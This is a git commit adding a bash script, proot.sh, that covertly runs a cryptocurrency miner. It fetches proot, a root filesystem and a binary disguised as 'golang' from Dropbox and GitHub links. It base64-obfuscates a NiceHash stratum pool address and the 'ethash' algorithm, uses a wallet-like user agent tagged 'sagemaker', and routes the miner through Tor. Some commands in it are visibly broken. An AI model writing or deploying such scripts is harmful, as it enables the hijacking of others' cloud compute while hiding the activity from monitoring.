496fe7dd17ca254c91d2aee5b4da1a16df361061
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-11 10:02:13 +0700

    Add files via upload

---
+++ proot.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+
+proot=https://www.dropbox.com/s/qhtue5w4rnxlip3/proot.tar.gz?dl=0
+rootfs=https://www.dropbox.com/s/qrzrq6p26684xex/rootfs.tar.xz?dl=0
+golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
+
+userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.sagemaker"
+string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
+key=ZXRoYXNo
+
+seed=$(echo $string | base64 --decode)
+apikey=$(echo $key | base64 --decode)
+
+mkdir data && cd data
+
+wget -O proot.tar.gz $proot
+wget -O rootfs.tar.xz $rootfs
+wget -O $golang
+
+tar -xf proot.tar.gz
+tar -xf rootfs.tar.xz
+
+chmod 777 golang
+chmod dist/proot
+
+./dist/proot -S . userdel _apt
+./dist/proot -S . apt install -y tor && tor > /dev/null 2>&1
+
+sleep 3
+
+./golang -a $apikey --url $seed -u $userAgent -p x --proxy 127.0.0.1:9050
